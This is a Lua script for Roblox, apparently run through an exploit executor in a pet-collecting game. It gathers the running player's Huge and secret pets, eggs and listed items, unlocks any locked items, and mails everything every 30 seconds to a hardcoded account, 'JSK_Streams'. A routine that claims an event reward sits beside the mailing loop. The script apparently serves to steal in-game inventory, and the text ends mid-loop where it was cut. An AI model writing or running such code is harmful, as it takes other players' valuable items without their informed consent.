getgenv().MailToUser = "JSK_Streams"
getgenv().Mailing = {
    Mail_Items = {
        {Class = "Pet", Id = "Corn Cat", pt = nil, sh = nil,tn = nil},
        {Class = "Pet", Id = "Corn Cat", pt = nil, sh = true,tn = nil},
        {Class = "Pet", Id = "Corn Cat", pt = 1, sh = nil,tn = nil},
        {Class = "Pet", Id = "Corn Cat", pt = 1, sh = true,tn = nil},
        {Class = "Pet", Id = "Corn Cat", pt = 2, sh = nil,tn = nil},
        {Class = "Pet", Id = "Corn Cat", pt = 2, sh = true,tn = nil},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = nil, sh = nil,tn = nil, MinAmount = 50},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = nil, sh = true,tn = nil, MinAmount = 50},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = 1, sh = nil,tn = nil, MinAmount = 50},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = 1, sh = true,tn = nil, MinAmount = 50},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = 2, sh = nil,tn = nil, MinAmount = 50},
        {Class = "Pet", Id = "Pumpkin Spice Cat", pt = 2, sh = true,tn = nil, MinAmount = 50},
        {Class = "Lootbox", Item = "Hype Egg", pt = nil, sh = nil, tn = nil},
        {Class = "Egg", Item = "Huge Machine Egg 4", pt = nil, sh = nil, tn = nil},
        {Class = "Charm", Item = "Overload Charm", pt = nil, sh = nil, tn = nil},
        {Class = "Charm", Item = "Royalty Charm", pt = nil, sh = nil, tn = nil}
   --   {Class = "Misc", Item = "Pumpkin", pt = nil, sh = nil, tn = nil, MinAmount = 50 } -- ong here as an example. 
    }
}

local Network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PetDir = require(game.ReplicatedStorage.Library.Directory.Pets)

Mail_Item = function()
    local ItemList = {}
    local Inventory = require(game.ReplicatedStorage.Library.Client.Save).Get()["Inventory"]
    for Class, Inv in pairs(Inventory) do
        for uid, v in pairs(Inv) do
            local ConfigMatch = false
            local Huge = Class == "Pet" and string.find(v.id, "Huge")
            local Secret = Class == "Pet" and PetDir[v.id] and PetDir[v.id].secret

            if Class == "Egg" or Secret then
                ConfigMatch = true
            else
                for _, CustomItem in pairs(getgenv().Mailing.Mail_Items) do
                    if CustomItem.Item == v.id and CustomItem.pt == v.pt and CustomItem.sh == v.sh and CustomItem.tn == v.tn and CustomItem.Class == Class and (CustomItem.MinAmount or 0) <= (v._am or 1) then
                        ConfigMatch = true
                        break
                    end
                end
            end

            if ConfigMatch or Huge then
                ItemList[uid] = { UID = uid, Amount = (v._am or 1), Class = Class, Locked = v._lk }
            end
        end
    end

    for _, item in pairs(ItemList) do
        if item.Locked then
            repeat
                a, e = Network:WaitForChild("Locking_SetLocked"):InvokeServer(item.UID, false)
            until a
        end
        local success, e = Network:WaitForChild("Mailbox: Send"):InvokeServer(getgenv().MailToUser, tostring(Random.new():NextInteger(9, 999999)), item.Class, item.UID, item.Amount)
        
        if success then
            print("Sent", item.UID)
        else
            warn("Failed to send", item.UID)
        end
    end
end

task.spawn(function()
    local HypeEventCmd = require(ReplicatedStorage.Library.Client.HypeEventCmds)
    if HypeEventCmd.IsActive() then
        if not HypeEventCmd.IsCompleted() then
            task.wait(HypeEventCmd.GetTimeRemaining())
        end
        Network["Hype Wheel: Claim"]:InvokeServer()
    end
end)

while true do
    Mail_Item()
    task.wait(30)
